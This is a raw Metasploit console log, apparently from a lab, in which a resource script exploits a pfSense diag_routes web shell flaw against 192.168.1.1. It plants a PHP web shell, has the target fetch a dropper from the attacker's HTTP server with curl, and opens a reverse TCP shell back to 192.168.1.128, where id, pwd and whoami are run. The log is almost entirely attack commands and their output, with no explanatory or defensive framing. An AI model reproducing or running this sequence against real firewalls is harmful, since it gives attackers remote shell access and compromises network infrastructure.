
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.16-dev                          ]
+ -- --=[ 2315 exploits - 1208 auxiliary - 412 post       ]
+ -- --=[ 975 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Start commands with a space to avoid saving 
them to history
Metasploit Documentation: https://docs.metasploit.com/

[*] Processing temp_pfsense.rc for ERB directives.
resource (temp_pfsense.rc)> use exploit/unix/http/pfsense_diag_routes_webshell
[*] Using configured payload bsd/x64/shell_reverse_tcp
resource (temp_pfsense.rc)> set RHOSTS 192.168.1.1
RHOSTS => 192.168.1.1
resource (temp_pfsense.rc)> set LHOST 192.168.1.128
LHOST => 192.168.1.128
resource (temp_pfsense.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
resource (temp_pfsense.rc)> sleep 10
[*] Started reverse TCP handler on 192.168.1.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Uploading webshell to /vEBPDS.php
[*] Testing if web shell installation was successful
[+] Web shell installed at /vEBPDS.php
[*] Executing BSD Dropper for bsd/x64/shell_reverse_tcp
[*] Using URL: http://192.168.1.128:8080/QQAR3RJO
[*] Client 192.168.1.1 (curl/7.76.1) requested /QQAR3RJO
[*] Sending payload to 192.168.1.1 (curl/7.76.1)
[*] Command Stager progress - 100.00% done (114/114 bytes)
resource (temp_pfsense.rc)> sessions -c id
[*] Running 'id' on shell session 1 (192.168.1.1)

resource (temp_pfsense.rc)> sessions -c pwd
[*] Running 'pwd' on shell session 1 (192.168.1.1)
[*] Command shell session 1 opened (192.168.1.128:4444 -> 192.168.1.1:22933) at 2023-07-18 08:11:16 +0700
[*] Server stopped.
[!] This exploit may require manual cleanup of '/usr/local/www/IOArfiDFXpPQ' on the target
[!] This exploit may require manual cleanup of '/usr/local/www/vEBPDS.php' on the target

resource (temp_pfsense.rc)> sessions -c whoami
[*] Running 'whoami' on shell session 1 (192.168.1.1)

resource (temp_pfsense.rc)> exit
[*] You have active sessions open, to exit anyway type "exit -y"
resource (temp_pfsense.rc)> exit -y
